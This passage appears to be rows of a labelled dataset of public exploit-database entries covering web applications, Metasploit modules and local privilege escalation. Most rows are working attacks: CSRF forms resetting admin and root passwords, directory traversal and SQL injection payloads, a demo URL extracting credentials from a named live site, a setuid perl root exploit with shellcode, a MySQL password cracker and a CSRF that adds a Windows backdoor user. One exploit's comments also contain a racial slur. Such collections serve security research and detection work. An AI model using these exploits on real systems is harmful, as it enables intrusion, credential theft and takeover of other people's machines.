value=""hacked@hacked.com""/> <input type=""hidden"" name=""cName"" value=""hacked""/> <input type=""hidden"" name=""cPren"" value=""hacked""/> <input type=""hidden"" name=""cPass"" value=""hacked""/> <input type=""hidden"" name=""cLevel"" value=""7""/> <input type=""hidden"" name=""cTekos"" value=""0""/> <input type=""submit"" value=""CSRFED This Shit""/> </form>  8- CSRF Change admin password and infos  <form action=""http://192.168.3.215/robert/fct/user_actions.php"" method=""POST""> <input type=""hidden"" name=""action"" value=""modifOwnUser""/> <input type=""hidden"" name=""id"" value=""1""/> <input type=""hidden"" name=""email"" value=""hacked""/> <input type=""hidden"" name=""nom"" value=""hacked""/> <input type=""hidden"" name=""prenom"" value=""hacked""/> <input type=""hidden"" name=""password"" value=""hacked""/> <input type=""submit"" value=""CSRFED This Shit""/> </form>  9- Directory traversal on Download fonction ( Read Arbitrary File)  http://192.168.3.215/robert/fct/downloader.php?dir=sql&file=../../../../../../etc/passwd param vuln : file script vuln : downloader.php  10- Directory traversal on Upload fonction (Upload file in root path)  POST /robert/fct/uploader.php?dataType=tekos&folder=../../config&qqfile=filename.jpg HTTP/1.1 Host: 192.168.3.215 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0 Accept: */* Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3 X-Requested-With: XMLHttpRequest X-File-Name: filename.jpg Content-Type: application/octet-stream Referer: http://192.168.3.215/robert/index.php?go=gens Content-Length: 99550 Cookie: YOURCOOKIE Connection: close  ...snip... file data ...snip...  param vuln : folder script vuln : uploader.php   11- Directory traversal on Delete fonction (Delete Arbitrary File)  POST /robert/fct/plans_actions.php HTTP/1.1 Host: 192.168.3.215 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0 Accept: */* Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3 Content-Type: application/x-www-form-urlencoded X-Requested-With: XMLHttpRequest Referer: http://192.168.3.215/robert/index.php?go=calendrier Content-Length: 42 Cookie:YOURCOOKIE Connection: close  action=supprFichier&idPlan=4&file=../../../../tested.txt  param vuln : file script vuln : plans_actions.php  11- SQL Injection   POST /robert/fct/plans_actions.php HTTP/1.1 Host: 192.168.3.215 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0 Accept: */* Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3 Content-Type: application/x-www-form-urlencoded X-Requested-With: XMLHttpRequest Referer: http://192.168.3.215/robert/index.php?go=calendrier Content-Length: 20 Cookie: YOURCOOKIE Connection: close  action=loadPlan&ID=2'  POST parameter 'ID' is vulnerable. Do you want to keep testing the others (if any)? [y/N] sqlmap identified the following injection point(s) with a total of 397 HTTP(s) requests: --- Parameter: ID (POST)     Type: boolean-based blind     Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment) (NOT)     Payload: action=loadPlan&ID=2' OR NOT 8111=8111#      Type: error-based     Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)     Payload: action=loadPlan&ID=2' AND (SELECT 3865 FROM(SELECT COUNT(*),CONCAT(0x7171787171,(SELECT (ELT(3865=3865,1))),0x717a7a7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- XhTe      Type: stacked queries     Title: MySQL > 5.0.11 stacked queries (comment)     Payload: action=loadPlan&ID=2';SELECT SLEEP(5)#      Type: AND/OR time-based blind     Title: MySQL >= 5.0.12 OR time-based blind     Payload: action=loadPlan&ID=2' OR SLEEP(5)-- zwwN ---  param vuln : ID script vuln : plans_actions.php  ------------------------------------------------------------------------------------------------------------------------------  #### Special Thanks to SC, PC and Mana l'artiste from HTTPCS - Ziwit SecTeam ####  ------------------------------------------------------------------------------------------------------------------------------",Robert,1
14821,"Shop Creator 4.0 - SQL Injection ######################################################### --------------------------------------------------------- Portal Name: Shop Creator Version: 4.0 Vendor: http://www.etoshop.com Author : Pouya_Server , Pouya.s3rver@Gmail.com Website: http://Pouya-Server.ir Vulnerability : (Auth Bypass) SQL Injection Vulnerability --------------------------------------------------------- ######################################################### [Auth Bypass]: user: pouya pass: ' or ' admin page : http://site.com/[path]/admin.asp --------------------------------- Victem : http://www.etoshop.com/demo/pcstore --------------------------------------------------------- #########################################################",.etoshop.,1
23544,vicomsoft rapidcache server 2.0/2.2.6 - Directory Traversal source: https://www.securityfocus.com/bid/9428/info  It has been reported that RapidCache may be prone to a directory traversal vulnerability that may allow a remote attacker to access information outside the server root directory using '../' character sequences.  RapidCache versions 2.2.6 and prior have been reported to be prone to this issue.  http://www.example.com:8080/../../../../../../../../windows/win.ini,vicomsoft,1
40184,"WebKit - TypedArray.copyWithin Memory Corruption <!-- There is a bug in TypedArray.copyWithin that can be used to write to an absolute pointer.   In JavaScriptCore/runtime/JSGenericTypedArrayViewPrototypeFunctions.h, the function genericTypedArrayViewProtoFuncCopyWithin contains the following code:      long length = thisObject->length();     long to = argumentClampedIndexFromStartOrEnd(exec, 0, length);     long from = argumentClampedIndexFromStartOrEnd(exec, 1, length);     long final = argumentClampedIndexFromStartOrEnd(exec, 2, length, length);      if (final < from)         return JSValue::encode(exec->thisValue());      long count = std::min(length - std::max(to, from), final - from);      typename ViewClass::ElementType* array = thisObject->typedVector();     memmove(array + to, array + from, count * thisObject->elementSize);  argumentClampedIndexFromStartOrEnd will call valueOf on a parameter to the copyWithin function, which can contain a function that neuters the this array, causing the variable ""array"" to be null. However, the ""to"" and ""from"" variables can be very large values, up to 0x7fffffff, which could be valid pointers on ARM and 32-bit platforms. This allows an absolute pointer in this range to be written to.  An HTML file demonstrating this issue is attached. This issue affects Safari Technology Preview and WebKit, but has not made it into production Safari yet (TypedArray.copyWithin is not supported). -->  <html> <body> <script>  function f(){    try{    alert(""t"");    postMessage(""test"", ""http://127.0.0.1"", [q])    alert(a.byteLength);    alert(q.byteLength);   } catch(e){      alert(e.message);    alert(a.byteLength)    alert(q.byteLength);   }    return 0x22345678; }  alert(Date);  var q = new ArrayBuffer(0x7fffffff); var o = {valueOf : f} var a = new Uint8Array(q);    // alert(q.byteLength); var t = [];  a.copyWithin(0x12345678, o, 0x32345678);   </script> </body> </html>",webkit,1
21295,"GNUJSP 1.0 - File Disclosure source: https://www.securityfocus.com/bid/4125/info  GNUJSP is a freely available, open-source implementation of Sun's Java Server Pages. It will run on most Unix and Linux variants, as well as Microsoft Windows NT/2000 operating systems.  It has been reported that a remote attacker may disclose the contents of directories via a specially crafted web request. This may be exploited to list directories, read the contents of arbitrary web-readable files, and disclose script source code. The attacker simply appends the name of the directory and/or file to be disclosed to a web request for /servlets/gnujsp/.  It should be noted that this may allow an attacker to circumvent .htaccess files.  This issue may be the result of a configuration error.   http://site/servlets/gnujsp/[dirname]/[file]",GNUJSP,1
16673,"Digital Music Pad 8.2.3.3.4 - Local Stack Buffer Overflow (Metasploit) ## # $Id: digital_music_pad_pls.rb 10998 2010-11-11 22:43:22Z jduck $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = NormalRanking  	include Msf::Exploit::FILEFORMAT 	include Msf::Exploit::Remote::Seh  	def initialize(info = {}) 		super(update_info(info, 			'Name' => 'Digital Music Pad Version 8.2.3.3.4 Stack Buffer Overflow', 			'Description' => %q{ 					This module exploits a buffer overflow in Digital Music Pad Version 8.2.3.3.4 				When opening a malicious pls file with the Digital Music Pad, 				a remote attacker could overflow a buffer and execute 				arbitrary code. 			}, 			'License' => MSF_LICENSE, 			'Author' => 				[ 					'Abhishek Lyall <abhilyall[at]gmail.com>' 				], 			'Version' => '$Revision: 10998 $', 			'References' => 				[ 					[ 'OSVDB', '68178' ], 					[ 'URL', 'http://secunia.com/advisories/41519/' ], 					[ 'URL', 'http://www.exploit-db.com/exploits/15134' ], 				], 			'DefaultOptions' => 				{ 					'EXITFUNC' => 'process', 				}, 			'Payload' => 				{ 					'Space' => 4720, 					'BadChars' => ""\x00\x20\x0a\x0d"", 					'DisableNops' => 'True', 				}, 			'Platform' => 'win', 			'Targets' => 				[ 					[ 'Windows XP SP2', { 'Ret' => 0x73421DEF } ], # p/p/r msvbvm60.dll 				], 			'Privileged' => false, 			'DefaultTarget' => 0, 			'DisclosureDate' => 'Sep 17 2010'))  		register_options( 			[ 				OptString.new('FILENAME', [ false, 'The file name.', 'msf.pls']), 			], self.class) 	end  	def exploit  		# PLS Header 		sploit = ""[playlist]\n"" 		sploit << ""File1=""  		sploit << rand_text_alphanumeric(260) 		sploit << generate_seh_record(target.ret)  		sploit << ""\x90"" * 12                   # nop sled 		sploit << payload.encoded  		sploit << ""\x90"" * (4720 - payload.encoded.length)  		print_status(""Creating '#{datastore['FILENAME']}' file ..."") 		file_create(sploit) 	end  end",Digital,1
31604,"Parallels Virtuozzo Containers 3.0.0-25.4.swsoft VZPP Interface Change Pass - Cross-Site Request Forgery source: https://www.securityfocus.com/bid/28593/info  Parallels Virtuozzo Containers is prone to a cross-site request-forgery vulnerability.  Exploiting the issue will allow a remote attacker to use a victim's currently active session to change the victim's password. Successful exploits will compromise affected computers.  Virtuozzo Containers 3.0.0-25.4.swsoft is vulnerable; other versions are also affected.   <!-- poplix papuasia.org -- http://px.dynalias.org -- 04-02-2008 this file exploits a vulnerable installation of virtuozzo web panel by setting root password to ""csrfsafepass"" tested against Version 25.4.swsoft (build: 3.0.0-25.4.swsoft) perform the following steps to test it: 1. in this file replace 127.0.0.1 with target vps address 2. open a web browser and log into virtuozzo web interface 3. open this file in a new browser window and click the ""change pwd"" --> <form target=vrtifr name=""defaultForm"" method=""post"" action=""https://127.0.0.1:4643/vz/cp/pwd""> <input type=""hidden"" name=""passwd"" value=""csrfsafepass""> <input type=""hidden"" name=""retype"" value=""csrfsafepass""> <input type=""hidden"" name=""_submit"" value=""Change"" > </form> <iframe style=""width:1px;height:1px;visibility:hidden"" name=""vrtifr""></iframe> <input type=button value=""change pwd"" onclick=""document.defaultForm.submit()"">",Parallels,1
21993,"AjaXplorer - 'checkInstall.php' Remote Command Execution (Metasploit) ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # web site for more information on licensing and terms of use. #   http://metasploit.com/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = ExcellentRanking  	include Msf::Exploit::Remote::HttpClient  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'AjaXplorer checkInstall.php Remote Command Execution', 			'Description'    => %q{ 					This module exploits an arbitrary command execution vulnerability in the 				AjaXplorer 'checkInstall.php' script. All versions of AjaXplorer prior to 				2.6 are vulnerable. 			}, 			'Author'         => 				[ 					'Julien Cayssol',  #Credited according to SecurityFocus 					'David Maciejak',  #Metasploit module 					'sinn3r'           #Final touch on the Metasploit module 				], 			'License'        => MSF_LICENSE, 			'References'     => 				[ 					[ 'OSVDB', '63552' ], 					[ 'BID', '39334' ] 				], 			'Privileged'     => false, 			'Payload'        => 				{ 					'DisableNops' => true, 					'Space'       => 512, 					'Compat'      => 						{ 							'ConnectionType' => 'find', 							'PayloadType' => 'cmd', 							'RequiredCmd' => 'generic perl ruby python bash telnet' 						} 				}, 			'Platform'       => ['unix', 'bsd', 'linux', 'osx', 'windows'], 			'Arch'           => ARCH_CMD, 			'Targets'        => [[ 'AjaXplorer 2.5.5 or older', { }]], 			'DisclosureDate' => 'Apr 4 2010', 			'DefaultTarget' => 0))  		register_options( 			[ 				OptString.new('TARGETURI', [true, 'The base path to AjaXplorer', '/AjaXplorer-2.5.5/']) 			], self.class) 	end  	def check 		target_uri.path << '/' if target_uri.path[-1,1] != '/' 		clue = Rex::Text::rand_text_alpha(rand(5) + 5)  		res = send_request_cgi({ 			'method' => 'GET', 			'uri'      => ""#{target_uri.path}plugins/access.ssh/checkInstall.php"", 			'vars_get' => { 				'destServer'    => ""||echo #{clue}"" 			} 		})  		# If the server doesn't return the default redirection, probably something is wrong 		if res and res.code == 200 and res.body =~ /#{clue}/ 			return Exploit::CheckCode::Vulnerable 		end  		return Exploit::CheckCode::Safe 	end  	def exploit 		peer = ""#{rhost}:#{rport}"" 		target_uri.path << '/' if target_uri.path[-1,1] != '/'  		# Trigger the command execution bug 		res = send_request_cgi({ 			'method' => 'GET', 			'uri'      => ""#{target_uri.path}plugins/access.ssh/checkInstall.php"", 			'vars_get' => 				{ 					'destServer'    => ""||#{payload.encoded}"" 				} 			})  		if res 			print_status(""#{peer} - The server returned: #{res.code} #{res.message}"") 			m = res.body.scan(/Received output:\s\[([^\]]+)\]/).flatten[0] || ''  			if m.empty? 				print_error(""#{peer} - This server may not be vulnerable"") 			else 				print_status(""#{peer} - Command output from the server:"") 				print_line(m) 			end 		end 	end  end  =begin Repo: http://sourceforge.net/projects/ajaxplorer/files/ajaxplorer/2.6/ =end",ajaxplorer,1
31022,PHP Running Management 1.0.2 - 'index.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/27268/info  PHP Running Management is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  This issue affects versions prior to PHP Running Management 1.0.3.  http://www.example.com/index.php?message=%3Cscript%3Edocument.writeln(123)%3C/script%3E%20,PHP,1
791,"Setuid perl - 'PerlIO_Debug()' Local Overflow /*  * Copyright Kevin Finisterre  *  * Setuid perl PerlIO_Debug() overflow  *  * Tested on Debian 3.1 perl-suid 5.8.4-5   *  * (11:07:20) *corezion:* who is tha man with tha masta plan?  * (11:07:36) *corezion:* a nigga with a buffer overrun  * (11:07:39) *corezion:* heh  * (of course that is to the tune of http://www.azlyrics.com/lyrics/drdre/niggawittagun.html)  *  * cc -o ex_perl2 ex_perl2.c -std=c99  *   * kfinisterre@jdam:~$ ./ex_perl2  * Dirlen: 1052  * Charlie Murphy!!!@#@  * sh-2.05b# id  * uid=1000(kfinisterre) gid=1000(kfinisterre) euid=0(root)   *   */  #include <stdlib.h> #include <stdio.h> #include <strings.h> #include <string.h> #include <sys/stat.h> #include <sys/types.h> #include <unistd.h>  int main(int *argc, char **argv) { 	int len = 23;  	int count = 5; 	char malpath[10000]; 	char tmp[256]; 	char *filler; 	char *ptr;  	unsigned char code[] =  	/* 	  0xff-less execve() /bin/sh by anathema <anathema@hack.co.za> 	  Linux/IA32 0xff-less execve() shellcode.   	 */         ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""         ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""         ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""         ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""          // setuid(0) - fix for redhat based machines 	""\x31\xdb""                      // xorl         %ebx,%ebx 	""\x8d\x43\x17""                  // leal         0x17(%ebx),%eax 	""\xcd\x80""                      // int          $0x80  	""\x89\xe6""                          /* movl %esp, %esi          */ 	""\x83\xc6\x30""                      /* addl $0x30, %esi         */ 	""\xb8\x2e\x62\x69\x6e""              /* movl $0x6e69622e, %eax   */ 	""\x40""                              /* incl %eax                */ 	""\x89\x06""                          /* movl %eax, (%esi)        */ 	""\xb8\x2e\x73\x68\x21""              /* movl $0x2168732e, %eax   */ 	""\x40""                              /* incl %eax                */ 	""\x89\x46\x04""                      /* movl %eax, 0x04(%esi)    */ 	""\x29\xc0""                          /* subl %eax, %eax          */ 	""\x88\x46\x07""                      /* movb %al, 0x07(%esi)     */ 	""\x89\x76\x08""                      /* movl %esi, 0x08(%esi)    */ 	""\x89\x46\x0c""                      /* movl %eax, 0x0c(%esi)    */ 	""\xb0\x0b""                          /* movb $0x0b, %al          */ 	""\x87\xf3""                          /* xchgl %esi, %ebx         */ 	""\x8d\x4b\x08""                      /* leal 0x08(%ebx), %ecx    */ 	""\x8d\x53\x0c""                      /* leal 0x0c(%ebx), %edx    */ 	""\xcd\x80""                          /* int $0x80                */;   	chdir(""/tmp/"");  	// do one less char than usual for RedHat  	filler = ""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/""; 	 	for (int x=0; x<4; x=x+1) 	{ 		mkdir(filler, 0777); 		chdir(filler); 		// do one less char than usual for RedHat  		count = count + 255;		 	}          memset(tmp,0x41,len);   	count = count + len;          ptr = tmp+len;         ptr = putLong (ptr, 0xbffffb6a); // frame 11 ebp         ptr = putLong (ptr, 0xbffffb6a);          ptr = putLong (ptr, 0xbffffb6a);  	strcat(tmp, ""/""); 	mkdir(tmp, 0777); 	chdir(tmp);  	printf (""Dirlen: %d\n"", count);   	FILE *perlsploit; 	char perldummyfile[] = {                 ""#!/usr/bin/sperl5.8.4\n""                 ""# \n""                 ""# Be proud that perl(1) may proclaim: \n""                 ""#   Setuid Perl scripts are safer than C programs ...\n""                 ""# Do not abandon (deprecate) suidperl. Do not advocate C wrappers. \n""         };          if(!(perlsploit = fopen(""take_me.pl"",""w+""))) {                 printf(""error opening file\n"");                 exit(1);         }         fwrite(perldummyfile,sizeof(perldummyfile)-1,1,perlsploit);         fclose(perlsploit);  	getcwd(malpath, 10000); 	strcat(malpath, ""/""); 	strcat(malpath, ""take_me.pl""); 	printf(""Charlie Murphy!!!@#@\n"");  	chmod(malpath,0755);         setenv(""PERLIO_DEBUG"", ""/tmp/ninjitsu"", 1); 	setenv(""PERL5LIB"", code, 1); 	execv(malpath,(char *) NULL);  } /*  * put a address in mem, for little-endian  *  */ char* putLong (char* ptr, long value) {     *ptr++ = (char) (value >> 0) & 0xff;     *ptr++ = (char) (value >> 8) & 0xff;     *ptr++ = (char) (value >> 16) & 0xff;     *ptr++ = (char) (value >> 24) & 0xff;      return ptr; }  // milw0rm.com [2005-02-07]",perl,1
32656,"Octeth Oempro 3.5.5 - Multiple SQL Injections source: https://www.securityfocus.com/bid/32784/info  Octeth Oempro is prone to multiple SQL-injection vulnerabilities because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting these issues could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  Octeth Oempro 3.5.5.1 is vulnerable; other versions may also be affected.  The following example input data is available:  Email: ' or 0=0 # Password: password",Octeth,1
38109,"Oracle MySQL / MariaDB - Insecure Salt Generation Security Bypass source: https://www.securityfocus.com/bid/56837/info  MySQL and MariaDB are prone to a security-bypass weakness.  An attacker may be able to exploit this issue to aid in brute-force attacks; other attacks may also be possible.   use Net::MySQL;  $|=1;  my $mysql = Net::MySQL->new(  hostname => '192.168.2.3',  database => 'test',  user     => ""user"",  password => ""secret"",  debug => 0, );  $crackuser = ""crackme"";  while(<stdin>) { chomp; $currentpass = $_;  $vv = join ""\0"",                 $crackuser,                 ""\x14"".                 Net::MySQL::Password->scramble(                         $currentpass, $mysql->{salt}, $mysql->{client_capabilities}                 ) . ""\0""; if ($mysql->_execute_command(""\x11"", $vv) ne undef) {         print ""[*] Cracked! --> $currentpass\n"";         exit; } } --- example session:  C:\Users\kingcope\Desktop>C:\Users\kingcope\Desktop\john179\run\jo hn --incremental --stdout=5 | perl mysqlcrack.pl Warning: MaxLen = 8 is too large for the current hash type, reduced to 5 words: 16382  time: 0:00:00:02  w/s: 6262  current: citcH words: 24573  time: 0:00:00:04  w/s: 4916  current: rap words: 40956  time: 0:00:00:07  w/s: 5498  current: matc3 words: 49147  time: 0:00:00:09  w/s: 5030  current: 4429 words: 65530  time: 0:00:00:12  w/s: 5354  current: ch141 words: 73721  time: 0:00:00:14  w/s: 5021  current: v3n words: 90104  time: 0:00:00:17  w/s: 5277  current: pun2 [*] Cracked! --> pass words: 98295  time: 0:00:00:18  w/s: 5434  current: 43gs Session aborted",Oracle,1
11012,"ITaco Group ITaco.biz - 'view_news' SQL Injection ============================================================================= +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ ----------------------------------------------------------------------------- ############################################################################ # (+) Title : ITaco Group ITaco.biz (view_news) SQL Injection Vulnerability # (+) Auther: Err0R # (+) Site : sa-hacker.com/vb # (+) Email : a5q(AT)hotmail(dot)com ############################################################################ -----------------------------------------------------------------------------  # (+) dork : intext""powered by itaco group""  -----------------------------------------------------------------------------  # (+) Exploit : site/path/view_news.php?id=-999+union+select+1,2,3,4,5,6,7,8,9-- and you come the Inject (+) Demo :- Username : http://ardabiliec.ir/view_news.php?id=-117+union+select+1,2,3,userid,5,6,7,8,9+from+ardabil_ardabil_iec.userlog%20--  Passoword: http://ardabiliec.ir/view_news.php?id=-117+union+select+1,2,3,password,5,6,7,8,9+from+ardabil_ardabil_iec.users--  ----------------------------------------------------------------------------- ------------- Good Luck ------------- # (+) Greetz To :- ===================================================+ all member in www .Sa-hacker.com/vb | ++++++++++++++++++++++++++++++++++++++++++++ | Special To :Pepsi & Dr.X3 & wlhaan & X-SHADOW | ++++++++++++++++++++++++++++++++++++++++++++ | ===================================================+  ----------------------------------------------------------------------------- +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ =============================================================================",ITaco,1
29296,"KDE LibkHTML 4.2 - NodeType Function Denial of Service source: https://www.securityfocus.com/bid/21662/info  KDE libkhtml is prone to a denial-of-service vulnerability.  This issue is triggered when an attacker convinces a victim user to open a malicious HTML document via an affected application such as kmail or Konqueror.   Remote attackers may exploit this issue to crash applications that use the affected library, effectively denying service to legitimate users.  <HTML> <HEAD> <RANGE <COL SPAN <>> <FRAMESET onload > </HEAD> </HTML>",KDE,1
29176,"ASP ListPics 5.0 - 'Listpics.asp' SQL Injection source: https://www.securityfocus.com/bid/21279/info  ASP ListPics is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database implementation.  ASP ListPics version 5.0 is vulnerable.  http://www.example.com/path/listpics.asp?a=show&ID=[SQL INJECTION]",ASP,1
40809,"EasyPHP Devserver 16.1.1 - Cross-Site Request Forgery / Remote Command Execution [+] Credits: John Page aka hyp3rlinx  [+] Website: hyp3rlinx.altervista.org  [+] Source: http://hyp3rlinx.altervista.org/advisories/EASYPHP-DEV-SERVER-REMOTE-CMD-EXECUTION.txt  [+] ISR: ApparitionSec    Vendor: =============== www.easyphp.org    Product: ============================= EasyPHP Devserver v16.1.1  easyphp-devserver-16.1.1-setup.exe hash: 64184d330a34be9e6c029ffa63c903de   A complete WAMP environment for PHP development & personal web hosting. Host with Webserver PHP, Apache, MySQL, Nginx, PhpMyAdmin, Xdebug, PostgreSQL, MongoDB, Python, Ruby...for Windows.   Vulnerability Type: ================================= CSRF / Remote Command Execution    CVE Reference: ============== N/A    Vulnerability Details: =====================  EasyPHP Devserver dashboard runs on port 1111, the PHP code contains mulitple RCE vectors, which can allow arbitrary OS commands to be executed on the target system by remote attackers, if a user visits malicious webpage or link.  The ""index.php"" and ""explorer.php"" files both contain vulnerable code that will happily process both GET / POST RCE requests. Below EasyPHP Code contains no CSRF token or checks whatsoever. All attacker needs is to supply 'type' and command values.  Possibility for RFI (remote file inclusion) if the ""allow_url_include=0"" setting is changed in ""php.ini"" configuration. No checks or CSRF tokens for PHP include directives either, the default however is set to Off.  e.g. RFI attempt result Warning: include(): http:// wrapper is disabled in the server configuration by allow_url_include=0   line 8 of ""explorer.php"" ======================  //== ACTIONS ==================================================================  if (isset($_POST['action'])) {  // Include and exec if (isset($_POST['action']['request'])) { foreach ($_POST['action']['request'] as $request) { if ($request['type'] == 'include') include(urldecode($request['value'])); if ($request['type'] == 'exe') exec(urldecode($request['value'])); } } $redirect = ""http://"" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']; header(""Location: "" . $redirect); exit; }   //////////////////////////////////////////////////  line 48 ""index.php"" ==================   //== ACTIONS ==================================================================  if (isset($_POST['action'])) {  // Include and exec if (isset($_POST['action']['request'])) { foreach ($_POST['action']['request'] as $request) { if ($request['type'] == 'include') include(urldecode($request['value'])); if ($request['type'] == 'exe') exec(urldecode($request['value'])); } } sleep(1); $redirect = ""http://"" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']; header(""Location: "" . $redirect); exit; }  if (isset($_GET['action'])) { // Include and exec if ($_GET['action'] == 'include') include(urldecode($_GET['value'])); if ($_GET['action'] == 'exe') exec(urldecode($_GET['value'])); if (isset($_GET['redirect'])) { $redirect = urldecode($_GET['redirect']); } else { $redirect = 'http://127.0.0.1:1111/index.php'; } sleep(1); header(""Location: "" . $redirect); exit; }     Exploit code(s): ===============  1) Add Backdoor User Account  <form action=""http://127.0.0.1:1111/explorer.php"" method=""post""> <input type=""hidden"" name=""action[request][0][type]"" value=""exe""> <input type=""hidden"" name=""action[request][0][value]"" value=""net user EVIL Password /add""> <script>document.forms[0].submit()</script> </form>    2) Run ""calc.exe""  <a href=""http://127.0.0.1:1111/index.php?action=exe&value=calc.exe "">Clicky...</a>     Disclosure Timeline: ====================================== Vendor Notification: No replies November 22, 2016 : Public Disclosure     Exploitation Technique: ======================= Remote    Severity Level: ================ Medium     [+] Disclaimer The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise. Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information or exploits by the author or elsewhere.  hyp3rlinx",EasyPHP,1
35511,"Humhub 0.10.0-rc.1 - Multiple Persistent Cross-Site Scripting Vulnerabilities # Exploit Title: Humhub <= 0.10.0-rc.1 multiple persistent XSS vulnerabilities # Date: 08-12-2014 # Exploit Author: Jos Wetzels, Emiel Florijn # Vendor Homepage: https://www.humhub.org # Software Link: https://github.com/humhub/humhub/releases # Version: <= 0.10.0-rc.1  The Humhub [1] social networking kit versions 0.10.0-rc.1 and prior suffer from multiple persistent Cross-Site Scripting vulnerabilities, which have now been resolved in cooperation with the vendor [2], in various parts of the codebase.  1. Post/comment persistent XSS vulnerability  In the function actionPost() in ""/protected/modules_core/post/controllers/PostController.php"" [3], the $_POST variable is cleaned using a now-outdated version of the Yii framework's CmsInput extension stripClean() function [4], which improperly sanitizes user-input for XSS [5]. This situation also applies to actionPost() in ""/protected/modules_core/comment/controllers/CommentController.php"" [6]  Proof of Concept: making a post or comment with the URL-encoded form of either: 	<a href = ""data:text/html,test"">test</a> 	<img src = ""index.php?r=user/auth/logout"">  Will insert the corresponding HTML elements into the post/comment body.  2. Humhub-modules-mail [7] persistent XSS vulnerability  Humhub-modules-mail versions 0.5.9 and prior (when used in conjunction with Humhub 0.10.0-rc.1 or prior) is affected by the same vulnerability as described above. The vulnerable code is located in the function actionCreate() in ""/controllers/MailController.php"" [8]. Since every private message sent to a humhub user is also sent to the user's e-mail in the form of a HTML-enabled notification e-mail, an attacker can insert custom HTML elements in the body of the e-mail with grave consequences. It should be noted that the displayed in-system private messages are not susceptible to this attack vector.  3. Admin error logging persistent XSS vulnerability  In addition to the above, the admin error logging codebase is vulnerable to a persistent XSS vulnerability (with an even less restrictive set of injectable elements) as well. In most modules' error logging functionality, there is no XSS sanitation on the error message before passing it to the database and since there is no XSS sanitation before displaying error messages in the admin error logging interface, causing an error with a URL-encoded XSS string (different modules' error logging allow for different XSS vectors) in the parameter will cause the XSS to be persistently logged in the admin error logging interface, potentially allowing an attacker, among other attack vectors, to hijack the admin's session.  Proof of Concept: performing either of the following requests: 		index.php?r=post/post/post%3Csvg%20onload%3Dalert(1)%3E 		index.php?r=mail/mail/indexdf%3Cimg%20src=%22x%22%20onerror=%22alert(1)%22%3E 		index.php?r=notification/list/index&from=999)%3Cscript%3Ealert(1)%3C/script%3E  Wil insert the corresponding script elements into the admin error logging interface.  It should be noted that all XSS attack vectors require at least regular user-level access to the humhub system.  [*] References: 1. http://humhub.org 2. https://github.com/humhub/humhub/commit/febb89ab823d0bd6246c6cf460addabb6d7a01d4 3. https://github.com/humhub/humhub/blob/22d4cc040b56ed72c7bdc17a14af087b06a2cf18/protected/modules_core/post/controllers/PostController.php#L41 4. https://github.com/humhub/humhub/blob/9274a701b316cf8da0d05862066a90a3585fff01/protected/extensions/CmsInput.php#L165 5. http://packetstormsecurity.com/files/129373/yiicmsinput-xss.txt 6. https://github.com/humhub/humhub/blob/22d4cc040b56ed72c7bdc17a14af087b06a2cf18/protected/modules_core/comment/controllers/CommentController.php#L139 7. https://github.com/humhub/humhub-modules-mail 8. https://github.com/humhub/humhub-modules-mail/blob/04e4f2dad17ed0e4aec0d5a61a5ef979f416e98b/controllers/MailController.php#L300",.humhub.,1
